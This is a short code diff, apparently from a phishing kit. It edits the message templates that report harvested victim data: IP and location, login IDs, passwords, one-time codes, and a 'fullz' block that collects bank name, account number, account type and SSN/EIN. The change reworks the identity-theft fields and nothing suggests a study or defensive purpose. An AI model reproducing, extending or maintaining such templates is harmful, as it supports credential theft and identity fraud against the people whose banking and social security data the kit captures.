@@ -25,7 +25,7 @@ const end = `\n${tab}🌐 IP: {ip}${tab}🌍 Country: {country}${tab}🏙️ Reg
 const login = "📧 User ID: {login}";
 const password = "🔐 Password: {password}";
 const code = "🔐 Code: {code}";
-const fullz = `🧑🏼‍💼 Account Name: {name}${tab}🏦 Account Number: {number}${tab}🏦 Routing Number: {routing}${tab}🪪 SSN/EIN: {ssn}`;
+const fullz = `🏦 Bank Name: {bank}${tab}🧑🏼‍💼 Account Name: {name}${tab}🏦 Account Number: {number}${tab}🏦 Account Type: {type}${tab}🪪 SSN/EIN: {ssn}`;
 
 export const RESPONSES = {
   loginOne: `${start}${login}${end}`,
